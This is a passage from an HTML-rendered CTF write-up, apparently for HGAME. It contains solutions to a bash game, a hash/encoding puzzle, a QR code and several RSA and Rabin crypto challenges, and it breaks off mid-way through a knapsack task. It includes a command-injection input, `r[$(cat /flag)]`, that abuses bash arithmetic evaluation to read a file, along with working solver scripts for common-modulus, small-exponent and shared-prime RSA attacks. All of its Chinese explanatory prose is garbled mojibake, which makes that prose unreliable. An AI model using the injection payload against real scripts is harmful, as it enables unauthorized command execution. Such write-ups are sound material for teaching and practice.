class="variable">$&#123;score&#125;</span>\033[0m&quot;</span>;</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>sshè¿æ¥ï¼Œé€‰æ‹© <code>n</code>ï¼Œè¾“å…¥ç›®æ ‡åˆ†æ•° <code>r[$(cat /flag)]</code>ï¼Œç¡®è®¤è¿›å…¥æ¸¸æˆï¼Œå¿«é€Ÿç»“æŸä¸€å±€ååœ¨ç»“æœå¤„ä»¥æŠ¥é”™å½¢å¼è¾“å‡ºflagï¼š<code>hgame&#123;Bash_Game^Also*Can#Rce^reVenge!!!!&#125;</code>ã€‚</p><p>â€‹</p><h3 id="Sign-In-Pro-Max"><a href="#Sign-In-Pro-Max" class="headerlink" title="Sign In Pro Max"></a>Sign In Pro Max</h3><blockquote><p>å…”å…”æ²¡æœ‰æŠ¢åˆ°å›å®¶çš„è½¦ç¥¨ï¼Œä¸€ä¸ªçŒ«çŒ«å¤´åƒçš„å­¦é•¿ç»™äº†ä»–ä¸€ä¸ªå€™è¡¥è½¦ç¥¨æŠ¢ç¥¨è½¯ä»¶ï¼Œä½†æ˜¯è¿™ä¸ªè½¯ä»¶çš„éªŒè¯ç å¤ªéš¾äº†ï¼Œä½ èƒ½å¸®ä»–è§£ä¸€ä¸‹å—ï¼Ÿ flag è‹±æ–‡å­—æ¯ä¸ºå…¨å°å†™ï¼Œè‡ªè¡Œä½¿ç”¨ hgame{}åŒ…è£¹åæäº¤</p></blockquote><p>äº”ä¸ªéƒ¨åˆ†ï¼š</p><p>Part1ï¼šbase64+base58+base32ï¼Œå¾—åˆ° <code>f51d3a18</code>ï¼›</p><p>Part2ï¼šmd5ï¼Œå¾—åˆ° <code>f91c</code>ï¼›</p><p>Part3ï¼šsha1ï¼Œå¾—åˆ° <code>4952</code>ï¼›</p><p>Part4ï¼šsha256ï¼Œå¾—åˆ° <code>a3ed</code>ï¼›</p><p>Part5ï¼šrot21ï¼Œå¾—åˆ° <code>Part5 is 0bc0ea61d21c, now put all the parts together, don&#39;t forget the format.</code></p><p>æŒ‰UUIDæ ¼å¼è¿æ¥å¾—flagï¼š <code>hgame&#123;f51d3a18-f91c-4952-a3ed-0bc0ea61d21c&#125;</code>ã€‚</p><p>â€‹</p><h3 id="crazy-qrcode"><a href="#crazy-qrcode" class="headerlink" title="crazy_qrcode"></a>crazy_qrcode</h3><blockquote><p>å…”å…”åœ¨ä¹°å¹´è´§,ä½†æ˜¯çœ‹ç€å•†å®¶çš„ä»˜æ¬¾äºŒç»´ç çŠ¯äº†éš¾</p></blockquote><p>pngå›¾ç‰‡çš„äºŒç»´ç æ— æ³•æ‰«æï¼Œä½¿ç”¨<a target="_blank" rel="noopener" href="https://merricx.github.io/qrazybox/">QRazyBox</a>å¯¼å…¥ï¼Œåˆ©ç”¨è‡ªå¸¦å·¥å…· Brute-force Format Info Pattern å¯ä»¥å¾—åˆ°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Decoded Message :</span><br><span class="line">QDjkXkpM0BHNXujs</span><br><span class="line">Error Correction Level : H</span><br><span class="line">Mask Pattern : 4</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>QDjkXkpM0BHNXujs</code> è§£å‹zipå‹ç¼©åŒ…ï¼Œå¾—åˆ°25å¼ åˆ†å‰²çš„äºŒç»´ç å›¾ç‰‡ï¼Œä»¥åŠä¸€ä¸ª25é•¿åº¦çš„æ•°ç»„ã€‚</p><p>1ä¸º90Â°æ—‹è½¬ï¼Œ2ä¸º180Â°æ—‹è½¬ï¼Œ3ä¸º270Â°æ—‹è½¬ï¼Œ0ä¸ºä¸æ—‹è½¬ï¼Œ?ä¸ºéœ€é€‰æ‹©å…¶ä¸­ä¸€ä¸ªå€¼è°ƒæ•´ã€‚</p><p>æŒ‰ç…§5Ã—5æ‹¼æ¥å¥½åæ‰«æå¾—åˆ°flagï¼š<code>hgame&#123;Cr42y_qrc0de&#125;</code>ã€‚</p><p>â€‹</p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Rabin"><a href="#Rabin" class="headerlink" title="Rabin"></a>Rabin</h3><blockquote><p>çœ‹èµ·æ¥éå¸¸åƒRSAå‘¢ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_key</span>(<span class="params">kbits</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        p = getPrime(kbits)</span><br><span class="line">        q = getPrime(kbits)</span><br><span class="line">        <span class="keyword">if</span> p % <span class="number">4</span> == <span class="number">3</span> <span class="keyword">and</span> q % <span class="number">4</span>== <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> p, q</span><br><span class="line"></span><br><span class="line">p ,q = gen_key(<span class="number">256</span>)</span><br><span class="line">   flag =  <span class="built_in">open</span>(<span class="string">&quot;flag&quot;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">   pt = bytes_to_long(flag)</span><br><span class="line">   c = <span class="built_in">pow</span>(pt, <span class="number">2</span>, p*q)</span><br><span class="line">   </span><br><span class="line">   <span class="built_in">print</span>(<span class="string">f&quot;p=<span class="subst">&#123;p&#125;</span>\nq=<span class="subst">&#123;q&#125;</span>&quot;</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">f&quot;c=<span class="subst">&#123;<span class="built_in">hex</span>(c)[<span class="number">2</span>:]&#125;</span>&quot;</span>)</span><br><span class="line">   </span><br><span class="line">   <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">p=65428327184555679690730137432886407240184329534772421373193521144693375074983</span></span><br><span class="line"><span class="string">q=98570810268705084987524975482323456006480531917292601799256241458681800554123</span></span><br><span class="line"><span class="string">   c=4e072f435cbffbd3520a283b3944ac988b98fb19e723d1bd02ad7e58d9f01b26d622edea5ee538b2f603d5bf785b0427de27ad5c76c656dbd9435d3a4a7cf556</span></span><br><span class="line"><span class="string">   &quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure></blockquote><p>$e=2$ï¼ŒRabinç®—æ³•è§£RSAã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rabin_decrypt</span>(<span class="params">c, p, q, e=<span class="number">2</span></span>):</span></span><br><span class="line">	n = p * q</span><br><span class="line">	mp = <span class="built_in">pow</span>(c, (p + <span class="number">1</span>) // <span class="number">4</span>, p)</span><br><span class="line">	mq = <span class="built_in">pow</span>(c, (q + <span class="number">1</span>) // <span class="number">4</span>, q)</span><br><span class="line">	yp = gmpy2.invert(p, q)</span><br><span class="line">	yq = gmpy2.invert(q, p)</span><br><span class="line">	r = (yp * p * mq + yq * q * mp) % n</span><br><span class="line">	rr = n - r</span><br><span class="line">	s = (yp * p * mq - yq * q * mp) % n</span><br><span class="line">	ss = n - s</span><br><span class="line">	<span class="keyword">return</span> (r, rr, s, ss)</span><br><span class="line"> </span><br><span class="line">p = <span class="number">65428327184555679690730137432886407240184329534772421373193521144693375074983</span></span><br><span class="line">q = <span class="number">98570810268705084987524975482323456006480531917292601799256241458681800554123</span></span><br><span class="line">c = <span class="number">0x4e072f435cbffbd3520a283b3944ac988b98fb19e723d1bd02ad7e58d9f01b26d622edea5ee538b2f603d5bf785b0427de27ad5c76c656dbd9435d3a4a7cf556</span></span><br><span class="line">m = rabin_decrypt(c,p,q)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		<span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m[i])[<span class="number">2</span>:]))</span><br><span class="line">	<span class="keyword">except</span>:</span><br><span class="line">		<span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># b&#x27;hgame&#123;That&#x27;5_s0_3asy_to_s@lve_r@bin&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="RSA-å¤§å†’é™©1"><a href="#RSA-å¤§å†’é™©1" class="headerlink" title="RSA å¤§å†’é™©1"></a>RSA å¤§å†’é™©1</h3><blockquote><p>é©¬ä¸Šè¦è¿‡å¹´å–½ï¼Œå…”å…”å¼€å¿ƒåœ°å»è¶…å¸‚ä¹°å¹´è´§ï¼Œä½†æ˜¯è¶…å¸‚é—¨å£å´å†™ç€â€åªæœ‰å®ŒæˆæŒ‘æˆ˜æ‰èƒ½è¿›å…¥è¶…å¸‚â€ï¼Œä½ èƒ½å¸®å¸®å…”å…”å—</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># challenge1.py</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> challenges <span class="keyword">import</span> chall1_secret</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RSAServe</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span></span><br><span class="line">        self.e = <span class="number">65537</span></span><br><span class="line">        self.p = getPrime(<span class="number">128</span>)</span><br><span class="line">        self.q = getPrime(<span class="number">100</span>)</span><br><span class="line">        self.r = getPrime(<span class="number">100</span>)</span><br><span class="line">        self.m = chall1_secret</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">self</span>):</span></span><br><span class="line">        m_ = bytes_to_long(self.m)</span><br><span class="line">        c = <span class="built_in">pow</span>(m_, self.e, self.p*self.q*self.r)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">hex</span>(c)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">self, msg</span>):</span></span><br><span class="line">        <span class="keyword">return</span> msg == self.m</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">pubkey</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.p*self.q*self.r, self.e, self.p</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># challenge2.py</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> challenges <span class="keyword">import</span> chall2_secret</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RSAServe</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span></span><br><span class="line">        self.p = getPrime(<span class="number">512</span>)</span><br><span class="line">        self.q = getPrime(<span class="number">512</span>)</span><br><span class="line">        self.e = <span class="number">65537</span></span><br><span class="line">        self.m = chall2_secret</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">self</span>):</span></span><br><span class="line">        m_ = bytes_to_long(self.m)</span><br><span class="line">        c = <span class="built_in">pow</span>(m_ ,self.e, self.p*self.q)</span><br><span class="line">        self.q = getPrime(<span class="number">512</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">hex</span>(c)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">self, msg</span>):</span></span><br><span class="line">        <span class="keyword">return</span> msg == self.m</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">pubkey</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.p*self.q, self.e</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># challenge3.py</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> challenges <span class="keyword">import</span> chall3_secret</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RSAServe</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span></span><br><span class="line">        self.p = getPrime(<span class="number">512</span>)</span><br><span class="line">        self.q = getPrime(<span class="number">512</span>)</span><br><span class="line">        self.e = <span class="number">3</span></span><br><span class="line">        self.m = chall3_secret</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">self</span>):</span></span><br><span class="line">        m_ = bytes_to_long(self.m)</span><br><span class="line">        c = <span class="built_in">pow</span>(m_, self.e, self.p*self.q)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">hex</span>(c)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">self, msg</span>):</span></span><br><span class="line">        <span class="keyword">return</span> msg == self.m</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">pubkey</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.p*self.q, self.e</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># challenge4.py</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> challenges <span class="keyword">import</span> chall4_secret</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RSAServe</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span></span><br><span class="line">        self.p = getPrime(<span class="number">512</span>)</span><br><span class="line">        self.q = getPrime(<span class="number">512</span>)</span><br><span class="line">        self.e = getPrime(<span class="number">17</span>)</span><br><span class="line">        self.m = chall4_secret</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">self</span>):</span></span><br><span class="line">        m_ = bytes_to_long(self.m)</span><br><span class="line">        c = <span class="built_in">pow</span>(m_, self.e, self.p*self.q)</span><br><span class="line">        self.e = getPrime(<span class="number">17</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">hex</span>(c)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">self, msg</span>):</span></span><br><span class="line">        <span class="keyword">return</span> msg == self.m</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">pubkey</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.p*self.q, self.e</span><br></pre></td></tr></table></figure></blockquote><p>æ±‚è§£å››å±‚RSAæ‹¿flagã€‚</p><p>ç¬¬ä¸€å±‚ï¼Œ$m&lt;p$ï¼Œæ— éœ€å®Œå…¨åˆ†è§£ $n$ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">322341817140424854310546430443927118765748131714269745607168549026570389299661764844365062948036437</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = <span class="number">304198953434620851532952216290120837853</span></span><br><span class="line">c = <span class="number">0x22ca52bc2ed70d7133a0916529d73ed1e91f36f6d7d7118d40de0cdae89c692d637a28727a4b90077d</span></span><br><span class="line">d = inverse_mod(e,p-<span class="number">1</span>)</span><br><span class="line">m = <span class="built_in">int</span>(<span class="built_in">pow</span>(c%p,d,p))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment"># b&#x27;m&lt;n_But_also_m&lt;p&#x27;</span></span><br></pre></td></tr></table></figure><p>ç¬¬äºŒå±‚ï¼Œ$\gcd(n1,n2)=p$ï¼Œäº¤äº’ä¸¤æ¬¡æ•°æ®ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">n1 = <span class="number">85985649208163776168434106703299680942043569819886697084537149593016735251489437349033723731635167019919946528408991797589149306964593269240843489773393816361050438737217630268220265477449408440087731905143882172966401806119978492409284761350964437389319354732032636067387214869765942537900408255046554977317</span></span><br><span class="line">c1 = <span class="number">0x75124a122559d227bb846448b401877c86e7ac67dc5a1329622a6b54bbae91d3bc5a9afb859d86d90ac24cdd76cc7fa0763be082d9aa9f0c487d44f7a0725d6f195d6168837468c505f92dd1da29b618e3de01292a9592a1b2ce3d4dcdc4cad202c3c1fe190bb2469cf401b1a2fef29b8e487db908f30085e262ef84e6501118</span></span><br><span class="line">n2 = <span class="number">59612565629569243187927748458601473421039478282275869456898180179757129074951912462324655640636883153553671190318605493897644967308094259008273993958933708638671942944003571666749098289527528628582925016986696150709641914606485011406578947680624107267500302631283661241951979431008098395802457051450378936263</span></span><br><span class="line">c2 = <span class="number">0x23db0d9129161ba5318a43bf18db2ac276faa8e6f75b9a48250dbbc04de5b6a67764f8f8917f3f11e4b7308d7563f262500abcc59f0dc44bdc20d438e9ad424dbf7b7187b6cab4eeb5b32fdeb800e8dd6afcea3f97d97bac3be5a5fe9fbb06717dbf43f68cf0f91754e4f89e9a606b21c1467d3b8a7a0ed10e40f3bfb1e81a6a</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = gcd(n1,n2)</span><br><span class="line">q1 = n1//p</span><br><span class="line">f = (p-<span class="number">1</span>)*(q1-<span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e,f)</span><br><span class="line">m = <span class="built_in">pow</span>(c1,d,n1)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment">#b&#x27;make_all_modulus_independent&#x27;</span></span><br></pre></td></tr></table></figure><p>ç¬¬ä¸‰å±‚ï¼Œ$e=3$ï¼Œ$m^e \lt n$ï¼Œå° $e$ æ”»å‡»ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n = <span class="number">62704397894391666479295080309251941192000653454396729807060395416391202444260383706554703418832720336900862424454646857290291688832249601582850489926515630514103107259941315796861595330414857499788329730467181727640390968106751789752583882632594974153970877867469382083206724358855594117005793286924964786309</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">c = <span class="number">0xfec61958cefda3eb5f709faa0282bffaded0a323fe1ef370e05ed3744a2e53b55bdd43e9594427c35514505f26e4691ba86c6dcff6d29d69110b15b9f84b0d8eb9ea7c03aaf24fa957314b89febf46a615f81ec031b12fe725f91af9d269873a69748</span></span><br><span class="line">m = gmpy2.iroot(c,e)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment">#b&#x27;encrypt_exponent_should_be_bigger&#x27;</span></span><br></pre></td></tr></table></figure><p>ç¬¬å››å±‚ï¼Œå…±æ¨¡æ”»å‡»ï¼Œäº¤äº’ä¸¤æ¬¡æ•°æ®ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2 <span class="keyword">as</span> gp</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span>(<span class="params">a, b</span>):</span></span><br><span class="line">	<span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">		<span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		g, y, x = egcd(b % a, a)</span><br><span class="line">		<span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"></span><br><span class="line">n = <span class="number">95910070679089754882020609736361209978330742771232029437332648538529286081128112666433856280432204891053831926879516053786710256434719058164494668021689267490579582989448124586518700994273232858281123929454653035358779110102882528619796861827968986375140987711988221162025924201304147782787221328299013679367</span></span><br><span class="line">e1 = <span class="number">81919</span></span><br><span class="line">c1 = <span class="number">0x1d884ae280842f2c9f26fd4ec97d3e4d8d58cbe2ec0420f2179451663b873989d9dac3d796f6be72c982f82cd96dc346620c7028e48d0059acaa0242b36646c82e08a3e327ca0e2ee5f5cba574ad02953f3302963cd75760ea6bb5d8bc955b0b3d1c4f885d20cb8bb2d720331cba9fb0fb6a433e2b1f1ac588cf820be4169add</span></span><br><span class="line">e2 = <span class="number">108041</span></span><br><span class="line">c2 = <span class="number">0x69bd0266cd0c825ea1ac562385bb42be7040e1002e31f73c4139127577aa1d9d2a5cc05236bf03afb126202609e9fecc717bd229145bc7c5972a05476a8b66b8be1740f4f468ac24e9d8ed3ed5836a537aed77ad910bbb185a0421ed9faf97776e128058563ef0520e9fdf6ad47408da86ed02ab46761b962f8f34750c3791e1</span></span><br><span class="line"></span><br><span class="line">s = egcd(e1, e2)</span><br><span class="line">s1 = s[<span class="number">1</span>]</span><br><span class="line">s2 = s[<span class="number">2</span>]</span><br><span class="line"><span class="keyword">if</span> s1&lt;<span class="number">0</span>:</span><br><span class="line">	s1 = - s1</span><br><span class="line">	c1 = gp.invert(c1, n)</span><br><span class="line"><span class="keyword">elif</span> s2&lt;<span class="number">0</span>:</span><br><span class="line">	s2 = - s2</span><br><span class="line">	c2 = gp.invert(c2, n)</span><br><span class="line"></span><br><span class="line">m = <span class="built_in">pow</span>(c1,s1,n)*<span class="built_in">pow</span>(c2,s2,n) % n</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment">#b&#x27;never_uese_same_modulus&#x27;</span></span><br></pre></td></tr></table></figure><p>å››æ¬¡æäº¤æ­£ç¡®å¾—flagï¼š<code>hgame&#123;W0w_you^knowT^e_CoMm0n_&amp;t$ack_@bout|RSA&#125;</code>ã€‚</p><p>â€‹</p><h3 id="åŒ…é‡Œæœ‰ä»€ä¹ˆ"><a href="#åŒ…é‡Œæœ‰ä»€ä¹ˆ" class="headerlink" title="åŒ…é‡Œæœ‰ä»€ä¹ˆ"></a>åŒ…é‡Œæœ‰ä»€ä¹ˆ</h3><blockquote><p>å…”å…”æ”¶åˆ°äº†ä¸€åŒ…å¹´è´§ï¼Œä½†æ˜¯ä»–å¿˜äº†é‡Œé¢æœ‰ä»€ä¹ˆäº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> gcd, s2n</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">plain = flag[<span class="number">6</span>:-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">assert</span> flag == <span class="string">&#x27;hgame&#123;&#x27;</span> + plain + <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">v = <span class="built_in">bin</span>(s2n(plain))[<span class="number">2</span>:]</span><br><span class="line">l = <span class="built_in">len</span>(v)</span><br><span class="line">a = [<span class="number">2</span> &lt;&lt; i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l)]</span><br><span class="line">m = randint(<span class="built_in">sum</span>(a), <span class="number">2</span> &lt;&lt; l + <span class="number">1</span>)</span><br><span class="line">w = randint(<span class="number">0</span>, m)</span><br><span class="line"><span class="keyword">assert</span> gcd(w, m) == <span class="number">1</span></span><br><span class="line">b = [w * i % m <span class="keyword">for</span> i <span class="keyword">in</span> a]</span><br><span class="line"></span><br><span class="line">c = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">    c += b[i] * <span class="built_in">int</span>(v[i])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;m = <span class="subst">&#123;m&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;b0 = <span class="subst">&#123;b[<span class="number">0</span>]&#125;</span>&#x27;</span>)</span><br><span class="line"><span 